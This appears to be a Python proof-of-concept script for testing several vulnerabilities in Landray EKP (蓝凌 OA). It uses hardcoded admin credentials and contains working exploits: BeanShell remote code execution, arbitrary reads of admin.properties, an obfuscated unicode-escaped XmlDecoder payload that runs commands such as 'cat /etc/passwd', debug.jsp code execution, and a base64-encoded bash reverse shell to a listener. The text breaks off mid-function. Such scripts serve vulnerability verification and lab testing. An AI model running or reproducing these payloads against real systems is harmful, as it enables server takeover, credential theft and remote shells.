import requests
import sys
import socket
import threading
# pip install pycryptodome
from Crypto.Cipher import AES
import base64
import re
import time

base_url = None
landray_ip = None
landray_port = None
local_ip = None
os_type = None

cookies = None

# 检查是否能够正常连接
def check_connection(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        s.connect((ip, int(port)))

        global local_ip
        local_ip = s.getsockname()[0]
        print("[INFO] 本机与 " + landray_ip + " 能够建立连接的 IP 为 " + local_ip)

        s.close()
        return True
    except socket.error as e:
        print(f"[ERROR] 连接失败，错误：{e}")
        return False

# 密码加密
def get_encrypt_password(value, session_id):
    key = session_id[0: 16]
    iv = session_id[16: 32]

    block_size = 16
    pad = lambda s: s + (block_size - len(s) % block_size) * chr(block_size - len(s) % block_size)
    value = pad(value)

    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    ciphertext = cipher.encrypt(value.encode())

    return "\u4435\u5320\u4d35" + base64.b64encode(ciphertext).decode()

# 获取 cookie
def get_cookies():
    # 获取随意一个 session id
    res1 = requests.get(base_url + '/ekp/login.jsp')
    set_cookie = res1.headers['Set-Cookie']
    old_session_id = set_cookie[set_cookie.find('=') + 1: set_cookie.find(';')]

    # 清除单点 cookie
    requests.get(base_url + '/ekp/resource/jsp/clearSsoCookie.jsp?s_ajax=true', headers={
        'Cookie': 'JSESSIONID=' + old_session_id,
    })

    # 对密码进行 aes 加密
    data = {
        'j_username': 'admin',
        'j_password': get_encrypt_password('asdf123.', old_session_id),
        'j_redirectto': ''
    }

    # 发送账户密码，获取新 session id
    res2 = requests.post(base_url + '/ekp/j_acegi_security_check', data=data, allow_redirects=False, headers={ 
        'Cookie': 'JSESSIONID=' + old_session_id,
    })
    set_cookie = res2.headers['Set-Cookie']
    new_session_id = set_cookie[set_cookie.find('=') + 1: set_cookie.find(';')]

    # 获取 LRToken
    res3 = requests.get(base_url + '/ekp/', headers={
        'Cookie': 'JSESSIONID=' + new_session_id,
    })

    # 不同蓝凌版本对 LRToken 的设置不同
    if res3.headers.get('Set-Cookie'):
        set_cookie = res3.headers['Set-Cookie']
    else:
        set_cookie = ''

    if 'LRToken' in set_cookie:
        LRToken = set_cookie[set_cookie.find('=') + 1: set_cookie.find(';')]
    else:
        LRToken = None

    # 验证 session id 和 LRToken 是否有效
    res4 = requests.get(base_url + '/ekp/', headers={ 
        'Cookie': 'JSESSIONID=' + new_session_id + ('' if LRToken == None else ';LRToken=' + LRToken),
    })

    if (res4.status_code == 200):
        global cookies
        cookies = 'JSESSIONID=' + new_session_id + ('' if LRToken == None else ';LRToken=' + LRToken)
        print('[INFO] Cookie 获取成功')
    else:
        print('[ERROR] Cookie 获取失败')

# treexml.tmpl 远程代码执行漏洞
def treexml_tmpl_command_execute():
    data = {
        's_bean': 'ruleFormulaValidate',
        'script':
            'try {                                              \
                String cmd = "whoami";                          \
                Process child = Runtime.getRuntime().exec(cmd); \
                InputStream in = child.getInputStream();        \
                int c;                                          \
                while ((c = in.read()) != -1) {                 \
                    System.out.print((char)c);                  \
                }                                               \
                in.close();                                     \
                try {                                           \
                    child.waitFor();                            \
                } catch (InterruptedException e) {              \
                    e.printStackTrace();                        \
                }                                               \
            } catch (IOException e) {                           \
                System.err.println(e);                          \
            }'
    }

    res = requests.post(base_url + '/ekp/data/sys-common/treexml.tmpl', data=data)
    
    if res.status_code == 200:
        print('[INFO] treexml.tmpl 远程代码执行成功')
    else:
        print('[ERROR] treexml.tmpl 远程代码执行失败')

# custom.jsp 任意文件读取漏洞
def custom_jsp_file_read():
    if os_type == 'linux':
        data = {
            'var': '{"body":{"file":"file:///home/ekp/ekp/WEB-INF/KmssConfig/admin.properties"}}'
        }
    elif os_type == 'windows':
        data = {
            'var': '{"body":{"file":"file:///C:/Users/Administrator/Desktop/ekp/WEB-INF/KmssConfig/admin.properties"}}'
        }

    res = requests.post(base_url + '/ekp/sys/ui/extend/varkind/custom.jsp', data=data)

    if 'password' in res.text:
        print('[INFO] custom.jsp 任意文件读取成功')
    else:
        print('[ERROR] custom.jsp 任意文件读取失败')

# XmlDecoder 反序列化远程代码执行漏洞
def XmlDecoder_command_execute():
    data = {
        'var': '{"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}',
        'fdParemNames': 11,
        'fdParameters': r'<java><void class="bsh.Interpreter"><void method="eval"><string>\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0028\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0072\u0065\u0066\u006c\u0065\u0063\u0074\u002e\u0046\u0069\u0065\u006c\u0064\u0020\u0066\u0020\u003d\u0020\u0067\u0072\u006f\u0075\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u0020\u003d\u0020\u0028\u0054\u0068\u0072\u0065\u0061\u0064\u005b\u005d\u0029\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0067\u0072\u006f\u0075\u0070\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u0069\u0020\u003d\u0020\u0030\u003b\u0020\u0069\u0020\u003c\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u003b\u0020\u0069\u002b\u002b\u0029\u0020\u007b\u0020\u0074\u0072\u0079\u0020\u007b\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u0020\u0074\u0020\u003d\u0020\u0074\u0068\u0072\u0065\u0061\u0064\u0073\u005b\u0069\u005d\u003b\u0069\u0066\u0020\u0028\u0074\u0020\u003d\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u0074\u0072\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u004e\u0061\u006d\u0065\u0028\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0065\u0078\u0065\u0063\u0022\u0029\u0020\u007c\u007c\u0020\u0021\u0073\u0074\u0072\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0068\u0074\u0074\u0070\u0022\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u0074\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0061\u0072\u0067\u0065\u0074\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0074\u0029\u003b\u0069\u0066\u0020\u0028\u0021\u0028\u006f\u0062\u006a\u0020\u0069\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u006f\u0066\u0020\u0052\u0075\u006e\u006e\u0061\u0062\u006c\u0065\u0029\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0074\u0068\u0069\u0073\u0024\u0030\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0068\u0061\u006e\u0064\u006c\u0065\u0072\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0053\u0075\u0070\u0065\u0072\u0063\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u0046\u0069\u0065\u006c\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0067\u006c\u006f\u0062\u0061\u006c\u0022\u0029\u003b\u0020\u007d\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u006f\u0062\u006a\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u0020\u003d\u0020\u0028\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u004c\u0069\u0073\u0074\u0029\u0020\u0028\u0066\u002e\u0067\u0065\u0074\u0028\u006f\u0062\u006a\u0029\u0029\u003b\u0066\u006f\u0072\u0020\u0028\u0069\u006e\u0074\u0020\u006a\u0020\u003d\u0020\u0030\u003b\u0020\u006a\u0020\u003c\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0073\u0069\u007a\u0065\u0028\u0029\u003b\u0020\u002b\u002b\u006a\u0029\u0020\u007b\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0073\u002e\u0067\u0065\u0074\u0028\u006a\u0029\u003b\u0066\u0020\u003d\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u0046\u0069\u0065\u006c\u0064\u0028\u0022\u0072\u0065\u0071\u0022\u0029\u003b\u0066\u002e\u0073\u0065\u0074\u0041\u0063\u0063\u0065\u0073\u0073\u0069\u0062\u006c\u0065\u0028\u0074\u0072\u0075\u0065\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0071\u0020\u003d\u0020\u0066\u002e\u0067\u0065\u0074\u0028\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u006f\u0072\u0029\u003b\u004f\u0062\u006a\u0065\u0063\u0074\u0020\u0072\u0065\u0073\u0070\u0020\u003d\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u0030\u005d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u0030\u005d\u0029\u003b\u0073\u0074\u0072\u0020\u003d\u0020\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u0029\u0020\u0072\u0065\u0071\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0067\u0065\u0074\u0048\u0065\u0061\u0064\u0065\u0072\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0071\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0022\u0043\u006d\u0064\u0022\u007d\u0029\u003b\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0021\u0073\u0074\u0072\u002e\u0069\u0073\u0045\u006d\u0070\u0074\u0079\u0028\u0029\u0029\u0020\u007b\u0020\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0053\u0074\u0061\u0074\u0075\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0032\u0030\u0030\u0029\u007d\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u0020\u0063\u006d\u0064\u0073\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0022\u002c\u0020\u0022\u002f\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u0020\u003a\u0020\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u007b\u0022\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u0022\u002c\u0020\u0022\u002d\u0063\u0022\u002c\u0020\u0073\u0074\u0072\u007d\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0020\u003d\u0020\u0053\u0079\u0073\u0074\u0065\u006d\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0022\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0022\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u0022\u0029\u0020\u003f\u0020\u0022\u0047\u0042\u004b\u0022\u003a\u0022\u0055\u0054\u0046\u002d\u0038\u0022\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0074\u0065\u0078\u0074\u0032\u0020\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u0053\u0063\u0061\u006e\u006e\u0065\u0072\u0028\u0028\u006e\u0065\u0077\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u0029\u002e\u0075\u0073\u0065\u0044\u0065\u006c\u0069\u006d\u0069\u0074\u0065\u0072\u0028\u0022\u005c\u005c\u0041\u0022\u0029\u002e\u006e\u0065\u0078\u0074\u0028\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0062\u0079\u0074\u0065\u005b\u005d\u0020\u0072\u0065\u0073\u0075\u006c\u0074\u003d\u0028\u0022\u0045\u0078\u0065\u0063\u0075\u0074\u0065\u003a\u0020\u0020\u0020\u0020\u0022\u002b\u006e\u0065\u0077\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0074\u0065\u0078\u0074\u0032\u002c\u0022\u0075\u0074\u0066\u002d\u0038\u0022\u0029\u0029\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u004e\u0061\u006d\u0065\u0029\u003b\u0074\u0072\u0079\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0074\u006f\u006d\u0063\u0061\u0074\u002e\u0075\u0074\u0069\u006c\u002e\u0062\u0075\u0066\u002e\u0042\u0079\u0074\u0065\u0043\u0068\u0075\u006e\u006b\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u003b\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0073\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u002c\u0020\u0069\u006e\u0074\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006f\u0062\u006a\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0030\u0029\u002c\u0020\u006e\u0065\u0077\u0020\u0049\u006e\u0074\u0065\u0067\u0065\u0072\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u002e\u006c\u0065\u006e\u0067\u0074\u0068\u0029\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u004e\u006f\u0053\u0075\u0063\u0068\u004d\u0065\u0074\u0068\u006f\u0064\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0076\u0061\u0072\u0035\u0029\u0020\u007b\u0020\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u0020\u003d\u0020\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0061\u0076\u0061\u002e\u006e\u0069\u006f\u002e\u0042\u0079\u0074\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0022\u0029\u003b\u006f\u0062\u006a\u0020\u003d\u0020\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006c\u0061\u0072\u0065\u0064\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0077\u0072\u0061\u0070\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0062\u0079\u0074\u0065\u005b\u005d\u002e\u0063\u006c\u0061\u0073\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0063\u006c\u0073\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u0072\u0065\u0073\u0075\u006c\u0074\u007d\u0029\u003b\u0072\u0065\u0073\u0070\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0022\u0064\u006f\u0057\u0072\u0069\u0074\u0065\u0022\u002c\u0020\u006e\u0065\u0077\u0020\u0043\u006c\u0061\u0073\u0073\u005b\u005d\u007b\u0063\u006c\u0073\u007d\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0072\u0065\u0073\u0070\u002c\u0020\u006e\u0065\u0077\u0020\u004f\u0062\u006a\u0065\u0063\u0074\u005b\u005d\u007b\u006f\u0062\u006a\u007d\u0029\u003b\u0020\u007d\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0074\u0072\u0075\u0065\u003b\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0069\u0066\u0020\u0028\u0066\u006c\u0061\u0067\u0029\u0020\u007b\u0020\u0062\u0072\u0065\u0061\u006b\u003b\u0020\u007d\u0020\u007d\u0020\u0063\u0061\u0074\u0063\u0068\u0020\u0028\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0020\u0065\u0029\u0020\u007b\u0020\u0063\u006f\u006e\u0074\u0069\u006e\u0075\u0065\u003b\u0020\u007d\u0020\u007d</string></void></void></java>'
    }

    if os_type == 'linux':
        headers = {
            'Cmd': 'cat /etc/passwd',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
    elif os_type == 'windows':
        headers = {
            'Cmd': 'type C:\\Users\\Administrator\\Desktop\\secret.txt',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

    res = requests.post(base_url + '/ekp/sys/ui/extend/varkind/custom.jsp', data=data, headers=headers)

    if 'Execute' in res.text:
        print('[INFO] XmlDecoder 反序列化远程代码执行成功')
    else:
        print('[ERROR] XmlDecoder 反序列化远程代码执行失败')

# debug.jsp 任意文件写入漏洞
def debug_jsp_file_write():
    data = 'fdCode=System.out.println("12345678");'

    res = requests.post(base_url + '/ekp/sys/common/debug.jsp', data=data, allow_redirects=False, headers={
        'Cookie': cookies,
        'Content-Type': 'application/x-www-form-urlencoded',
    })

    if res.status_code == 200:
        print('[INFO] debug.jsp 任意文件写入成功')
    elif res.status_code == 302 or cookies is None:
        print('[ERROR] debug.jsp 任意文件写入失败，cookies 不存在或无效')
    else:
        print('[ERROR] debug.jsp 任意文件写入失败')

# beanshell 远程代码执行漏洞
def beanshell_command_execute():
    if os_type == 'windows':
        print('[ERROR] Windows 系统下不支持此漏洞 POC')
        return

    # 启动本地服务端，监听反向连接
    def beanshell_command_execute_server():
        server_socket.bind(('0.0.0.0', 12345))
        server_socket.listen(1)
        server_ready_event.set()

        server_socket.settimeout(10)

        try:
            conn, addr = server_socket.accept()
            if addr is not None:
                print("[INFO] beanshell 远程代码执行成功")
        except socket.timeout:
            nonlocal  beanshell_res
            if 'success="1"' in beanshell_res.text:
                print("[INFO] beanshell 远程代码执行成功")
            else:
                print("[ERROR] beanshell 远程代码执行失败")

            # print("[ERROR] beanshell 远程代码执行失败")
        finally:
            server_socket.close()

    # 执行反弹 shell，攻击服务器
    def beanshell_command_execute_reverse_shell():
        reverse_shell = 'bash -i >& /dev/tcp/' + local_ip + '/12345 0>&1'
        encoded_bytes = base64.b64encode(reverse_shell.encode('utf-8'))
        encoded_string = encoded_bytes.decode('utf-8')

        data = {
            'var': '{"body":{"file":"/sys/common/dataxml.jsp"}}',
            's_bean': 'sysFormulaValidate',
            'script': 'Runtime.getRuntime().exec("/bin/bash -c {echo,' + encoded_string + '}|{base64,-d}|{bash,-i}");',
            'type': 'int',
            'modelName': 'test'
        }

        nonlocal  beanshell_res
